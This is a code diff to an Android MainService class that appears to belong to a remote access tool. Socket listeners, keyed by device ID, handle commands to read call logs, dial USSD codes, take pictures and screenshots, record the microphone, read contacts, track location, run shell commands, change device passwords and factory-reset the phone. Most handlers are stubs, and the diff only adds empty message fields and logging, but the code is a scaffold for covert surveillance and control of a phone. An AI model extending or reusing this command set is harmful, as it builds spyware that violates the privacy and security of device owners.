@@ -147,8 +147,10 @@ public class MainService extends Service {
                 jsonObject.put("device_id", device_id);
                 jsonObject.put("data", Voice.readCallLog(getApplicationContext()));
                 if (jsonObject != null) {
+                    jsonObject.put("message", "");
                     // emit json
                 }else {
+                    jsonObject.put("message", "");
                     // emit failed
                 }
             } catch (Exception exception) {
@@ -187,11 +189,14 @@ public class MainService extends Service {
                 jsonObject.put("device_id", device_id);
                 String result = Voice.dialUSSD(args[0].toString(), getApplicationContext());
                 if(result == "No USSD code supplied") {
+                    jsonObject.put("message", "");
                     // emit fialed
                 } else if(result == "API level not supported"){
+                    jsonObject.put("message", "");
                     // emit somethibg
                 }
-                else{
+                else {
+                    jsonObject.put("message", "");
                     // emit result
                 }
             } catch (Exception exception) {
@@ -207,6 +212,7 @@ public class MainService extends Service {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
 //                jsonObject.put("bytes", );
+                jsonObject.put("message", "");
             } catch (Exception exception) {
                 Log.i("takePicture", exception.getMessage());
             }
@@ -221,6 +227,7 @@ public class MainService extends Service {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
                 jsonObject.put("cameraList", cameraList);
+                jsonObject.put("message", "");
             } catch (Exception exception) {
                 Log.i("getCameraList", exception.getMessage());
             }
@@ -235,7 +242,7 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
                 Log.i("screenshot", exception.getMessage());
             }
@@ -250,6 +257,7 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
+                jsonObject.put("message", "");
             } catch (Exception exception) {
                 Log.i("changeWallpaper", exception.getMessage());
             }
@@ -260,7 +268,13 @@ public class MainService extends Service {
     private Emitter.Listener recordMicrophone = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
-
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+                jsonObject.put("message", "");
+            } catch (Exception exception) {
+                Log.i("recordMicrophone", exception.getMessage());
+            }
         }
     };
 
@@ -272,9 +286,10 @@ public class MainService extends Service {
             try {
                 jsonObject.put("device_id", device_id);
                 jsonObject.put("data", installedApps.toString());
+                jsonObject.put("message", "");
                 // if json data is empty emit failed else success
-            } catch (JSONException jsonException) {
-                jsonException.printStackTrace();
+            } catch (Exception exception) {
+                Log.i("listInstalledApps", exception.getMessage());
             }
         }
     };
@@ -286,9 +301,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("vibratePhone", exception.getMessage());
             }
         }
     };
@@ -299,9 +314,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("writeContact", exception.getMessage());
             }
         }
     };
@@ -312,9 +327,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("readContact", exception.getMessage());
             }
         }
     };
@@ -326,9 +341,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("resetPassword", exception.getMessage());
             }
         }
     };
@@ -339,9 +354,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("sendSerialCommand", exception.getMessage());
             }
         }
     };
@@ -352,9 +367,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("shCommand", exception.getMessage());
             }
         }
     };
@@ -365,9 +380,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("getLocation", exception.getMessage());
             }
         }
     };
@@ -378,9 +393,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("changeDevicePassword", exception.getMessage());
             }
         }
     };
@@ -391,9 +406,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("factoryResetDevice", exception.getMessage());
             }
         }
     };
@@ -404,9 +419,9 @@ public class MainService extends Service {
             try {
                 JSONObject jsonObject = new JSONObject();
                 jsonObject.put("device_id", device_id);
-
+                jsonObject.put("message", "");
             } catch (Exception exception) {
-
+                Log.i("rebootDevice", exception.getMessage());
             }
         }
     };
